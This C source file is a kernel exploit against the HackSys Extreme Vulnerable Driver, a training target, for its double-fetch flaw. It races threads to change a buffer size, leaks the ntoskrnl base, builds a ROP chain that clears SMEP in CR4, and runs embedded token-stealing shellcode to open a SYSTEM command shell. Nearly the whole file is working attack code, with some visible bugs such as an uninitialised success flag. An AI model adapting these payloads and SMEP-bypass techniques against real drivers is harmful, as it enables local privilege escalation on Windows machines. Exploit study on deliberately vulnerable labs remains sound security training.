#include <Windows.h>
#include <stdio.h>
#include <processthreadsapi.h>
#include <Psapi.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x222037

/* Structure for the user-mode buffer */
typedef struct _USER_DOUBLE_FETCH
{
    LPVOID  Buffer;
    SIZE_T  Size;
} USER_DOUBLE_FETCH, * PUSER_DOUBLE_FETCH;

/* Structure for needed data in IoControlThread function */
typedef struct _IO_THREAD_PARAM
{
    HANDLE              DriverHandle;
    PUSER_DOUBLE_FETCH  DoubleFetch;    // This member is a pointer to the _USER_DOUBLE_FETCH structure
} IO_THREAD_PARAM, * PIO_THREAD_PARAM;

/* Function to open a handle to the driver */
HANDLE OpenDriverHandle(void)
{
    HANDLE DriverHandle = NULL;

    /* Opens handle to driver */
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) // If handle cant open, exit.
    {
        printf("\t[!] FATAL: Failed to open driver handle!\n");
        exit(-1);
    }
    else
    {
        printf("\t[+] Opened Driver Handle: 0x%x\n", DriverHandle);
        return DriverHandle; // Return handle to driver to be used later.
    }
}

/* Function to check how many processors we have */
int CheckProcessors(void)
{
    SYSTEM_INFO SystemInfo = { 0 };

    /* Check if we have more than 4 processors as attack will take too otherwise */
    GetSystemInfo(&SystemInfo);
    if (SystemInfo.dwNumberOfProcessors < 2)
    {
        printf("[!] FATAL: You don't have enough processors, exiting!\n");
        exit(-1);
    }

    int NumProcessors = SystemInfo.dwNumberOfProcessors;
    return NumProcessors; // Return number of processors available to be used later.
}

/* Function to change the size member of the UserDoubleFetch struct */
DWORD WINAPI ChangeSizeThread(LPVOID Size)
{
    BOOL ExploitSuccess;
    int i = 0;

    printf("\t[+] Changing size on processor %d\n", GetCurrentProcessorNumber());

    // Run until we get control of RIP.
    while (!ExploitSuccess)
    {
        *(PULONG)Size ^= 0x00000828; // 2088
    }

    return EXIT_SUCCESS;
}

/* Function to issue IOCTL repeatedly */
DWORD WINAPI IoControlThread(LPVOID IoThreadParam)
{

    BOOL ExploitSuccess;

    PIO_THREAD_PARAM IoControlThreadParam = NULL;
    HANDLE DriverHandle = NULL;
    PUSER_DOUBLE_FETCH UserDoubleFetch = NULL;

    DWORD   BytesReturned = 0;
    int     i = 0;

    printf("[+] Sending IOCTL on processor %d\n", GetCurrentProcessorNumber());

    /* Get pointer to _IO_THREAD_PARAM struct */
    IoControlThreadParam = (PIO_THREAD_PARAM)IoThreadParam;

    /* Get DoubleFetch member from _IO_THREAD_PARAM struct */
    UserDoubleFetch = IoControlThreadParam->DoubleFetch;

    /* Get DriverHandle member from _IO_THREAD_PARAM struct */
    DriverHandle = IoControlThreadParam->DriverHandle;
    printf("%d", DriverHandle);
    // Run until we get control of RIP.
    while (!ExploitSuccess)
    {
        EmptyWorkingSet(GetCurrentProcess());

        if (!DeviceIoControl(DriverHandle, IOCTL_CODE, UserDoubleFetch, 3000, NULL, NULL, &BytesReturned, NULL))
        {
            printf("[!] FATAL: Unable to send IOCTL to driver!\n");
        }
    }

    return EXIT_SUCCESS;
}

unsigned long long GetKernelBase(void)
{

    LPVOID  lpImageBase[1024];
    DWORD   lpcbNeeded;

    /* Get base address of first driver (ntoskrnl.exe) */
    printf("[+] Obtaining Driver Base Address!\n");
    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
    if (!DriversBase)
    {
        printf("[!] FATAL: Error enumerating device drivers!\n");
        exit(1);
    }

    /* Get name of first driver (ntoskrnl.exe) */
    char BaseName[1024] = { 0 };
    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));
    if (!DriversBaseName)
    {
        printf("[!] FATAL: Error getting drivers base name!\n");
        exit(1);
    }

    /*
     * ntoskrnl.exe is the first module in lpImageBase.
     * typecast LPVOID -> unsigned long long
    */
    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];

    printf("[*] Driver base name is: %s\n", BaseName);
    printf("[*] %s is located at: 0x%p\n", BaseName, KernelBase);

    return KernelBase;

}

unsigned long long CreateShellcode(void)
{

    char payload[] = "\x41\x50\x41\x51\x50\x65\x4C\x8B\x04\x25\x88\x01\x00\x00\x41\xC7\x80\xE4"
                     "\x01\x00\x00\x00\x00\x00\x00\x4D\x8B\x88\xB8\x00\x00\x00\x4C\x89\xC8\x49"
                     "\x8B\x89\xE0\x02\x00\x00\x48\x83\xF9\x04\x74\x10\x4D\x8B\x89\xE8\x02\x00"
                     "\x00\x49\x81\xE9\xE8\x02\x00\x00\xEB\xE3\x49\x8B\x89\x58\x03\x00\x00\x80"
                     "\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x59\x41\x59\x41\x58\x48\x31\xC0\x48"
                     "\x31\xF6\x48\x83\xC4\x38\x4c\x89\xf3\xC3";


    /* Allocate shellcode in user mode */
    LPVOID shellcode = VirtualAlloc(NULL, sizeof(payload), 0x3000, 0x40);
    if (!shellcode)
    {
        printf("[-] FATAL: Unable to allocate shellcode!\n");
        exit(1);
    }
    printf("[+] Shellcode allocated at: 0x%p\n", shellcode);

    /* Move allocated space in user mode */
    BOOL MoveMem = RtlMoveMemory(shellcode, payload, sizeof(payload));
    if (!MoveMem)
    {
        printf("[-] FATAL: Unable to move shellcode into allocated memory!\n");
    }

    unsigned long long ShellcodeBase = (unsigned long long)shellcode;
    return ShellcodeBase;
}

DWORD WINAPI exploit(LPVOID DriverHandle)
{

    LPVOID  UserBuffer = { 0 };
    SIZE_T  UserBufferSize = 2096; // Offset for RIP control is at 2056.
    BOOL    ExploitSuccess;

    HANDLE ChangeSizeThreads[100] = { 0 };
    HANDLE IoControlThreads[100] = { 0 };

    PIO_THREAD_PARAM IoThreadParam = NULL;

    HANDLE ExploitThread = CreateThread(NULL, NULL, exploit, DriverHandle, CREATE_SUSPENDED, NULL);

    /* return number of processors */
    int NumProcessors = CheckProcessors();

    /* Allocate USER_DOUBLE_FETCH struct */
    USER_DOUBLE_FETCH* PtrUserDoubleFetch = (USER_DOUBLE_FETCH*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
    if (!PtrUserDoubleFetch)
    {
        printf("[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!\n");
        return;
    }

    /* Allocate USER_DOUBLE_FETCH members */
    UserBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
    if (!UserBuffer)
    {
        printf("[!] FATAL: Failed to allocate heap buffer!\n");
        return;
    }
    printf("\t[+] Allocated user buffer!\n");

    /* Initialize USER_DOUBLE_FETCH struct members */
    PtrUserDoubleFetch->Buffer = UserBuffer;
    PtrUserDoubleFetch->Size = 100;

    unsigned long long BaseAddress = GetKernelBase();
    unsigned long long ShellcodeAddress = CreateShellcode();

    unsigned long long ROP0 = BaseAddress + 0x4eaf14;       // mov rax, rcx ; ret
    unsigned long long ROP1 = BaseAddress + 0x478bf9;       // pop rcx ; ret
    unsigned long long ROP2 = 0x70678;                      // Disable SMEP
    unsigned long long ROP3 = BaseAddress + 0x169f37;       // mov cr4, rcx ; ret 

    RtlFillMemory(UserBuffer, UserBufferSize, 0x41);        // Fill buffer with junk till RIP
    RtlCopyMemory(&UserBuffer[2056], &ROP0, 0x8);           // mov rax, rcx ; ret
    RtlCopyMemory(&UserBuffer[2056 + 8], &ROP1, 0x8);       // pop rcx
    RtlCopyMemory(&UserBuffer[2056 + 16], &ROP2, 0x8);      // SMEP Disable Value
    RtlCopyMemory(&UserBuffer[2056 + 24], &ROP3, 0x8);      // Update CR4 
    RtlCopyMemory(&UserBuffer[2056 + 32], &ShellcodeAddress, 0x8);


    /* Allocate IO_THREAD_PARAM struct */
    IoThreadParam = (PIO_THREAD_PARAM*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_THREAD_PARAM));
    if (!IoThreadParam)
    {
        printf("[!] FATAL: Failed to allocate memory for IO thread!\n");
        return;
    }

    /* Initialise IO_THREAD_PARAM struct members */
    IoThreadParam->DriverHandle = DriverHandle;
    IoThreadParam->DoubleFetch = PtrUserDoubleFetch;

    ExploitSuccess = FALSE;

    for (int i = 0; i < NumProcessors; i++)
    {
        ChangeSizeThreads[i] = CreateThread(NULL, NULL, ChangeSizeThread, &PtrUserDoubleFetch->Size, CREATE_SUSPENDED, NULL);
        printf("\t[+] Opened thread for changing size %d\n", ChangeSizeThreads[i]);
        SetThreadPriority(ChangeSizeThreads[i], THREAD_PRIORITY_TIME_CRITICAL);
        printf("\t[+] Set ChangeSizeThread Priority to %d\n", GetThreadPriority(ChangeSizeThreads[i]));

        IoControlThreads[i] = CreateThread(NULL, NULL, IoControlThread, IoThreadParam, CREATE_SUSPENDED, NULL);
        printf("\t[+] Opened thread for IOCTL Control %d\n", IoControlThreads[i]);
        SetThreadPriority(IoControlThreads[i], THREAD_PRIORITY_TIME_CRITICAL);
        printf("\t[+] Set IoControlThread Priority to %d\n", GetThreadPriority(IoControlThreads[i]));

        SetThreadAffinityMask(ChangeSizeThreads[i], 1 << i);
        SetThreadAffinityMask(IoControlThreads[i], 1 << i + 1);
        printf("\t[+] Set Affinity Mask for target threads!\n");

        ResumeThread(ChangeSizeThreads[i]);
        ResumeThread(IoControlThreads[i]);
    }

    int i = 0;
    if (WaitForMultipleObjects(NumProcessors, ChangeSizeThreads, TRUE, 120000))
    {
        for (i = 0; i < NumProcessors; i++)
        {
            TerminateThread(ChangeSizeThreads[i], EXIT_SUCCESS);
            CloseHandle(ChangeSizeThreads[i]);

            TerminateThread(IoControlThreads[i], EXIT_SUCCESS);
            CloseHandle(IoControlThreads[i]);
        }
    }

    system("cmd.exe");
    printf("[*] 1337 System Shell Bozo");

}

int main()
{
    printf("[+] HEVD: Double Fetch\n");

    printf("[*] Opening handle to driver!\n");
    HANDLE DriverHandle = OpenDriverHandle();

    printf("[*] Running exploit function!\n");

    exploit(DriverHandle);

}